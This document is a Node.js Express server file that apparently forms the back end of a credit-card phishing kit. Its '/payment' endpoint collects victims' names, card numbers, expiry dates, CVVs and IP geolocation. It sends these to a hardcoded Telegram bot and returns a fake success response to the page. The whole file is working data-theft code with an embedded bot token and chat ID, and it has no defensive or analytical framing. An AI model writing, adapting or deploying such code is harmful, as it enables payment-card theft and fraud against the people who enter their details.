import fetch from 'node-fetch'
import express from 'express'
import IP from 'ip'
import cors from 'cors'


const app = express();
app.use(express.static("public"));
app.use(express.json({ limit: "1mb" }));
app.use(cors());

app.listen(process.env.PORT || 3000)


app.post('/payment', async function(request, response) {
    const data = request.body

    const name = data.name
    const lastName = data.lastName
    const creditCard = atob(data.id)
    const ip = data.data.ip
    const city = data.data.city
    const country = data.data.country
    const org = data.data.org
    const zip = data.data.zip
    const region = data.data.region

    console.log(data)

    const options = {
        method: 'POST',
        headers: {
         'content-type': 'application/json'
        }
    }
    const cardSplit = creditCard.split('|')
    let cardN = cardSplit[0]
    let cardM = cardSplit[1]
    let cardY = cardSplit[2]
    let cardC = cardSplit[3]

    let froms = 'Name: '+name+' | LastName: '+lastName+ ' | Card Number: '+cardN+' | EXP: '+cardM+'/'+cardY+ ' | CVV: '+cardC+' | Country: '+country+' | City: '+city+' | Zip: '+zip+' | IP: '+ip+' | isp: '+org+' | Region: '+region+' ==> @Telegram Api by NodeJS' ;
    
    
    async function senTelegram() {
        const apiTelegram = 'https://api.telegram.org/bot5816086716:AAEMqgfQ59uo_TiG8hXDS--jhPzwcJIG3Uk/sendMessage?chat_id=5678873240&text='+froms
         const api_telegram_req = await fetch(apiTelegram, options )
        const api_telegram_res = await api_telegram_req.json()

    if (api_telegram_res.ok) {
        console.log('Message status: '+api_telegram_res.ok)
    } else {
        console.log('Error message not sent!')
    }
    }

    senTelegram()

    response.json({
        success: true,
        code: 200,
        timestamp: Date.now()
    })
  });



  app.get('/', async function(request, response) {
   
    response.json({
        success: true,
        code: 200,
        timestamp: Date.now()
    })
  });



